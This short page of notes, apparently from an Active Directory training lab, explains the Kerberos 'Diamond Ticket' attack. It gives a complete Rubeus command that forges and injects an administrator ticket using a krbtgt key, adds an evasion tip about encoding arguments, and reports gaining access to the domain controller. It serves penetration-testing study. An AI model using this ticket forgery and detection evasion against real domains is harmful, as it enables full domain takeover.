# 💎 Diamond Ticket attack

We can simply use the following Rubeus command to execute the attack. Note that the command needs to be run from an elevated shell (Run as administrator). We take the usual OPSEC care of using Loader and ArgSplit to encode the arguments "diamond"

```
C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This will spawn a shell, now we can access the DC

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket" %}
